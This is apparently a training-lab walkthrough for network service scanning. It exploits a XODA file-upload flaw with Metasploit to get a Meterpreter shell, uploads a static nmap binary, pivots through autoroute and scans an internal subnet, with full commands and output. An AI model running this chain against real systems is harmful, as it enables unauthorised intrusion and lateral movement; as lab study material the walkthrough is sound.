# T1046: Network Service Scanning

## Overview

**Vulnerability:** XODA File Upload Vulnerability

**Metasploit Module:** `exploit/unix/webapp/xoda_file_upload`

**Learning Objectives:**

- Identify open ports on the target machine using Metasploit exploitation
- Develop bash scripts for automated port scanning
- Upload and execute static binaries on compromised systems for reconnaissance
- Identify services running on networked systems using remote tools

## Step 1: Enumeration

```txt
nmap -sS -sV -sC demo1.ine.local -oN demo1.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-11 13:38 IST
Nmap scan report for demo1.ine.local (192.170.43.3)
Host is up (0.000029s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-git:
|   192.170.43.3:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|_      https://github.com/fermayo/hello-world-lamp.git
|_http-title: XODA
|_http-server-header: Apache/2.4.7 (Ubuntu)
MAC Address: 02:42:C0:AA:2B:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.75 seconds

```

- **Directory Enumeration using Gobuster**

We perform directory enumeration to identify accessible web paths and potential file upload endpoints:

```bash
gobuster dir -u http://demo1.ine.local -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

The scan discovers several directories, most notably `/files/` which could be related to file uploads:

```txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://demo1.ine.local
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/mobile               (Status: 200) [Size: 5265]
/logo                 (Status: 200) [Size: 14598]
/files                (Status: 301) [Size: 317] [--> http://demo1.ine.local/files/]
/js                   (Status: 301) [Size: 314] [--> http://demo1.ine.local/js/]
Progress: 141708 / 141709 (100.00%)
===============================================================
Finished
===============================================================
```

### Analysis

**Key Findings:**

- The initial nmap scan reveals Apache httpd 2.4.7 running on port 80
- A Git repository is discoverable at `.git/`, pointing to https://github.com/fermayo/hello-world-lamp.git
- Directory enumeration reveals `/mobile/`, `/logo/`, `/files/`, and `/js/` directories
- The `/files/` directory (301 redirect) is particularly interesting as it suggests file management functionality

**Exploitation Strategy:**
Given that the lab confirms this is the XODA vulnerability, we leverage Metasploit's built-in exploit module for `unix/webapp/xoda_file_upload`. This module automates the exploitation of the file upload vulnerability, allowing us to gain remote code execution and establish a Meterpreter session.

## Step 2: Metasploit Exploitation

We use the XODA file upload exploit module to establish remote code execution:

**Configuration:**

- **Module:** `exploit/unix/webapp/xoda_file_upload`
- **RHOST:** `demo1.ine.local` (target host)
- **LHOST:** `eth1` (attacker listening interface)
- **TARGETURI:** `/` (web root where the vulnerable application is hosted)

```bash
meterpreter > shell
Process 819 created.
Channel 5 created.
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
243294: eth0@if243295: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:c0:aa:2b:03 brd ff:ff:ff:ff:ff:ff
    inet 192.170.43.3/24 brd 192.170.43.255 scope global eth0
       valid_lft forever preferred_lft forever
243296: eth1@if243297: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:c0:f8:f4:02 brd ff:ff:ff:ff:ff:ff
    inet 192.248.244.2/24 brd 192.248.244.255 scope global eth1
       valid_lft forever preferred_lft forever
```

## Step 3: Remote Network Reconnaissance

With a Meterpreter session established, we perform internal network scanning from the compromised machine to identify other hosts and services.

### Upload Static Nmap Binary

We upload a static nmap binary to the target machine, which allows us to perform network scans without requiring nmap to be pre-installed:

```bash
meterpreter > upload /root/static/binaries/nmap /tmp/nmap
```

- Once uploaded, we execute a shell command to make it executable and run a network sweep of the internal subnet:

```bash
meterpreter > shell

chmod +x /tmp/nmap
./nmap 192.248.244.0/24 -v
```

```textStarting Nmap 7.70 ( https://nmap.org ) at 2026-03-11 09:02 UTC
Unable to find nmap-services!  Resorting to /etc/services
Initiating Ping Scan at 09:02
Cannot find nmap-payloads. UDP payloads are disabled.

Scanning 256 hosts [2 ports/host]
Completed Ping Scan at 09:02, 2.91s elapsed (256 total hosts)
Initiating Parallel DNS resolution of 256 hosts. at 09:02

Completed Parallel DNS resolution of 256 hosts. at 09:02, 13.00s elapsed
Nmap scan report for 192.248.244.0 [host down]
Nmap scan report for 192.248.244.1 [host down]
Nmap scan report for 192.248.244.4 [host down]
Nmap scan report for 192.248.244.5 [host down]
Nmap scan report for 192.248.244.6 [host down]
Nmap scan report for 192.248.244.7 [host down]
Nmap scan report for 192.248.244.8 [host down]
Nmap scan report for 192.248.244.9 [host down]
Nmap scan report for 192.248.244.10 [host down]
Nmap scan report for 192.248.244.11 [host down]
Nmap scan report for 192.248.244.12 [host down]
Nmap scan report for 192.248.244.13 [host down]
Nmap scan report for 192.248.244.14 [host down]
Nmap scan report for 192.248.244.15 [host down]
Nmap scan report for 192.248.244.16 [host down]
Nmap scan report for 192.248.244.17 [host down]
Nmap scan report for 192.248.244.18 [host down]
Nmap scan report for 192.248.244.19 [host down]
Nmap scan report for 192.248.244.20 [host down]
Nmap scan report for 192.248.244.21 [host down]
Nmap scan report for 192.248.244.22 [host down]
Nmap scan report for 192.248.244.23 [host down]
Nmap scan report for 192.248.244.24 [host down]
Nmap scan report for 192.248.244.25 [host down]
Nmap scan report for 192.248.244.26 [host down]
Nmap scan report for 192.248.244.27 [host down]
Nmap scan report for 192.248.244.28 [host down]
Nmap scan report for 192.248.244.29 [host down]
Nmap scan report for 192.248.244.30 [host down]
Nmap scan report for 192.248.244.31 [host down]
Nmap scan report for 192.248.244.32 [host down]
Nmap scan report for 192.248.244.33 [host down]
Nmap scan report for 192.248.244.34 [host down]
Nmap scan report for 192.248.244.35 [host down]
Nmap scan report for 192.248.244.36 [host down]
Nmap scan report for 192.248.244.37 [host down]
Nmap scan report for 192.248.244.38 [host down]
Nmap scan report for 192.248.244.39 [host down]
Nmap scan report for 192.248.244.40 [host down]
Nmap scan report for 192.248.244.41 [host down]
Nmap scan report for 192.248.244.42 [host down]
Nmap scan report for 192.248.244.43 [host down]
Nmap scan report for 192.248.244.44 [host down]
Nmap scan report for 192.248.244.45 [host down]
Nmap scan report for 192.248.244.46 [host down]
Nmap scan report for 192.248.244.47 [host down]
Nmap scan report for 192.248.244.48 [host down]
Nmap scan report for 192.248.244.49 [host down]
Nmap scan report for 192.248.244.50 [host down]
Nmap scan report for 192.248.244.51 [host down]
Nmap scan report for 192.248.244.52 [host down]
Nmap scan report for 192.248.244.53 [host down]
Nmap scan report for 192.248.244.54 [host down]
Nmap scan report for 192.248.244.55 [host down]
Nmap scan report for 192.248.244.56 [host down]
Nmap scan report for 192.248.244.57 [host down]
Nmap scan report for 192.248.244.58 [host down]
Nmap scan report for 192.248.244.59 [host down]
Nmap scan report for 192.248.244.60 [host down]
Nmap scan report for 192.248.244.61 [host down]
Nmap scan report for 192.248.244.62 [host down]
Nmap scan report for 192.248.244.63 [host down]
Nmap scan report for 192.248.244.64 [host down]
Nmap scan report for 192.248.244.65 [host down]
Nmap scan report for 192.248.244.66 [host down]
Nmap scan report for 192.248.244.67 [host down]
Nmap scan report for 192.248.244.68 [host down]
Nmap scan report for 192.248.244.69 [host down]
Nmap scan report for 192.248.244.70 [host down]
Nmap scan report for 192.248.244.71 [host down]
Nmap scan report for 192.248.244.72 [host down]
Nmap scan report for 192.248.244.73 [host down]
Nmap scan report for 192.248.244.74 [host down]
Nmap scan report for 192.248.244.75 [host down]
Nmap scan report for 192.248.244.76 [host down]
Nmap scan report for 192.248.244.77 [host down]
Nmap scan report for 192.248.244.78 [host down]
Nmap scan report for 192.248.244.79 [host down]
Nmap scan report for 192.248.244.80 [host down]
Nmap scan report for 192.248.244.81 [host down]
Nmap scan report for 192.248.244.82 [host down]
Nmap scan report for 192.248.244.83 [host down]
Nmap scan report for 192.248.244.84 [host down]
Nmap scan report for 192.248.244.85 [host down]
Nmap scan report for 192.248.244.86 [host down]
Nmap scan report for 192.248.244.87 [host down]
Nmap scan report for 192.248.244.88 [host down]
Nmap scan report for 192.248.244.89 [host down]
Nmap scan report for 192.248.244.90 [host down]
Nmap scan report for 192.248.244.91 [host down]
Nmap scan report for 192.248.244.92 [host down]
Nmap scan report for 192.248.244.93 [host down]
Nmap scan report for 192.248.244.94 [host down]
Nmap scan report for 192.248.244.95 [host down]
Nmap scan report for 192.248.244.96 [host down]
Nmap scan report for 192.248.244.97 [host down]
Nmap scan report for 192.248.244.98 [host down]
Nmap scan report for 192.248.244.99 [host down]
Nmap scan report for 192.248.244.100 [host down]
Nmap scan report for 192.248.244.101 [host down]
Nmap scan report for 192.248.244.102 [host down]
Nmap scan report for 192.248.244.103 [host down]
Nmap scan report for 192.248.244.104 [host down]
Nmap scan report for 192.248.244.105 [host down]
Nmap scan report for 192.248.244.106 [host down]
Nmap scan report for 192.248.244.107 [host down]
Nmap scan report for 192.248.244.108 [host down]
Nmap scan report for 192.248.244.109 [host down]
Nmap scan report for 192.248.244.110 [host down]
Nmap scan report for 192.248.244.111 [host down]
Nmap scan report for 192.248.244.112 [host down]
Nmap scan report for 192.248.244.113 [host down]
Nmap scan report for 192.248.244.114 [host down]
Nmap scan report for 192.248.244.115 [host down]
Nmap scan report for 192.248.244.116 [host down]
Nmap scan report for 192.248.244.117 [host down]
Nmap scan report for 192.248.244.118 [host down]
Nmap scan report for 192.248.244.119 [host down]
Nmap scan report for 192.248.244.120 [host down]
Nmap scan report for 192.248.244.121 [host down]
Nmap scan report for 192.248.244.122 [host down]
Nmap scan report for 192.248.244.123 [host down]
Nmap scan report for 192.248.244.124 [host down]
Nmap scan report for 192.248.244.125 [host down]
Nmap scan report for 192.248.244.126 [host down]
Nmap scan report for 192.248.244.127 [host down]
Nmap scan report for 192.248.244.128 [host down]
Nmap scan report for 192.248.244.129 [host down]
Nmap scan report for 192.248.244.130 [host down]
Nmap scan report for 192.248.244.131 [host down]
Nmap scan report for 192.248.244.132 [host down]
Nmap scan report for 192.248.244.133 [host down]
Nmap scan report for 192.248.244.134 [host down]
Nmap scan report for 192.248.244.135 [host down]
Nmap scan report for 192.248.244.136 [host down]
Nmap scan report for 192.248.244.137 [host down]
Nmap scan report for 192.248.244.138 [host down]
Nmap scan report for 192.248.244.139 [host down]
Nmap scan report for 192.248.244.140 [host down]
Nmap scan report for 192.248.244.141 [host down]
Nmap scan report for 192.248.244.142 [host down]
Nmap scan report for 192.248.244.143 [host down]
Nmap scan report for 192.248.244.144 [host down]
Nmap scan report for 192.248.244.145 [host down]
Nmap scan report for 192.248.244.146 [host down]
Nmap scan report for 192.248.244.147 [host down]
Nmap scan report for 192.248.244.148 [host down]
Nmap scan report for 192.248.244.149 [host down]
Nmap scan report for 192.248.244.150 [host down]
Nmap scan report for 192.248.244.151 [host down]
Nmap scan report for 192.248.244.152 [host down]
Nmap scan report for 192.248.244.153 [host down]
Nmap scan report for 192.248.244.154 [host down]
Nmap scan report for 192.248.244.155 [host down]
Nmap scan report for 192.248.244.156 [host down]
Nmap scan report for 192.248.244.157 [host down]
Nmap scan report for 192.248.244.158 [host down]
Nmap scan report for 192.248.244.159 [host down]
Nmap scan report for 192.248.244.160 [host down]
Nmap scan report for 192.248.244.161 [host down]
Nmap scan report for 192.248.244.162 [host down]
Nmap scan report for 192.248.244.163 [host down]
Nmap scan report for 192.248.244.164 [host down]
Nmap scan report for 192.248.244.165 [host down]
Nmap scan report for 192.248.244.166 [host down]
Nmap scan report for 192.248.244.167 [host down]
Nmap scan report for 192.248.244.168 [host down]
Nmap scan report for 192.248.244.169 [host down]
Nmap scan report for 192.248.244.170 [host down]
Nmap scan report for 192.248.244.171 [host down]
Nmap scan report for 192.248.244.172 [host down]
Nmap scan report for 192.248.244.173 [host down]
Nmap scan report for 192.248.244.174 [host down]
Nmap scan report for 192.248.244.175 [host down]
Nmap scan report for 192.248.244.176 [host down]
Nmap scan report for 192.248.244.177 [host down]
Nmap scan report for 192.248.244.178 [host down]
Nmap scan report for 192.248.244.179 [host down]
Nmap scan report for 192.248.244.180 [host down]
Nmap scan report for 192.248.244.181 [host down]
Nmap scan report for 192.248.244.182 [host down]
Nmap scan report for 192.248.244.183 [host down]
Nmap scan report for 192.248.244.184 [host down]
Nmap scan report for 192.248.244.185 [host down]
Nmap scan report for 192.248.244.186 [host down]
Nmap scan report for 192.248.244.187 [host down]
Nmap scan report for 192.248.244.188 [host down]
Nmap scan report for 192.248.244.189 [host down]
Nmap scan report for 192.248.244.190 [host down]
Nmap scan report for 192.248.244.191 [host down]
Nmap scan report for 192.248.244.192 [host down]
Nmap scan report for 192.248.244.193 [host down]
Nmap scan report for 192.248.244.194 [host down]
Nmap scan report for 192.248.244.195 [host down]
Nmap scan report for 192.248.244.196 [host down]
Nmap scan report for 192.248.244.197 [host down]
Nmap scan report for 192.248.244.198 [host down]
Nmap scan report for 192.248.244.199 [host down]
Nmap scan report for 192.248.244.200 [host down]
Nmap scan report for 192.248.244.201 [host down]
Nmap scan report for 192.248.244.202 [host down]
Nmap scan report for 192.248.244.203 [host down]
Nmap scan report for 192.248.244.204 [host down]
Nmap scan report for 192.248.244.205 [host down]
Nmap scan report for 192.248.244.206 [host down]
Nmap scan report for 192.248.244.207 [host down]
Nmap scan report for 192.248.244.208 [host down]
Nmap scan report for 192.248.244.209 [host down]
Nmap scan report for 192.248.244.210 [host down]
Nmap scan report for 192.248.244.211 [host down]
Nmap scan report for 192.248.244.212 [host down]
Nmap scan report for 192.248.244.213 [host down]
Nmap scan report for 192.248.244.214 [host down]
Nmap scan report for 192.248.244.215 [host down]
Nmap scan report for 192.248.244.216 [host down]
Nmap scan report for 192.248.244.217 [host down]
Nmap scan report for 192.248.244.218 [host down]
Nmap scan report for 192.248.244.219 [host down]
Nmap scan report for 192.248.244.220 [host down]
Nmap scan report for 192.248.244.221 [host down]
Nmap scan report for 192.248.244.222 [host down]
Nmap scan report for 192.248.244.223 [host down]
Nmap scan report for 192.248.244.224 [host down]
Nmap scan report for 192.248.244.225 [host down]
Nmap scan report for 192.248.244.226 [host down]
Nmap scan report for 192.248.244.227 [host down]
Nmap scan report for 192.248.244.228 [host down]
Nmap scan report for 192.248.244.229 [host down]
Nmap scan report for 192.248.244.230 [host down]
Nmap scan report for 192.248.244.231 [host down]
Nmap scan report for 192.248.244.232 [host down]
Nmap scan report for 192.248.244.233 [host down]
Nmap scan report for 192.248.244.234 [host down]
Nmap scan report for 192.248.244.235 [host down]
Nmap scan report for 192.248.244.236 [host down]
Nmap scan report for 192.248.244.237 [host down]
Nmap scan report for 192.248.244.238 [host down]
Nmap scan report for 192.248.244.239 [host down]
Nmap scan report for 192.248.244.240 [host down]
Nmap scan report for 192.248.244.241 [host down]
Nmap scan report for 192.248.244.242 [host down]
Nmap scan report for 192.248.244.243 [host down]
Nmap scan report for 192.248.244.244 [host down]
Nmap scan report for 192.248.244.245 [host down]
Nmap scan report for 192.248.244.246 [host down]
Nmap scan report for 192.248.244.247 [host down]
Nmap scan report for 192.248.244.248 [host down]
Nmap scan report for 192.248.244.249 [host down]
Nmap scan report for 192.248.244.250 [host down]
Nmap scan report for 192.248.244.251 [host down]
Nmap scan report for 192.248.244.252 [host down]
Nmap scan report for 192.248.244.253 [host down]
Nmap scan report for 192.248.244.254 [host down]
Nmap scan report for 192.248.244.255 [host down]
Initiating Connect Scan at 09:02
Scanning 2 hosts [1204 ports/host]
Discovered open port 21/tcp on 192.248.244.3
Discovered open port 80/tcp on 192.248.244.2
Discovered open port 22/tcp on 192.248.244.3
Discovered open port 80/tcp on 192.248.244.3
Completed Connect Scan against 192.248.244.2 in 0.19s (1 host left)
Completed Connect Scan at 09:02, 0.19s elapsed (2408 total ports)
Nmap scan report for demo1.ine.local (192.248.244.2)
Host is up (0.00044s latency).
Not shown: 1203 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 192.248.244.3
Host is up (0.00048s latency).
Not shown: 1201 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Read data files from: /etc
Nmap done: 256 IP addresses (2 hosts up) scanned in 16.10 seconds
```

### Autoroute

```bash
metrepeter > run autoroute -s  192.248.244.0/24

```

- Check if we succesfully add route

```bash
run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.248.244.0      255.255.255.0      Session 1

```

- Background the sessions `Ctrl + Z`
- Change metasploit module to `auxiliary(scanner/portscan/tcp)`
  - SET RHOSTS 192.248.244.3 # Since we already know from nmap that 192.248.244.3 is online so we dont need to set /24

```bash
msf6 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-1000           yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS       192.248.244.3    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.
                                           html
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/portscan/tcp) > run

[+] 192.248.244.3:        - 192.248.244.3:21 - TCP OPEN
[+] 192.248.244.3:        - 192.248.244.3:22 - TCP OPEN
[+] 192.248.244.3:        - 192.248.244.3:80 - TCP OPEN
[*] 192.248.244.3:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
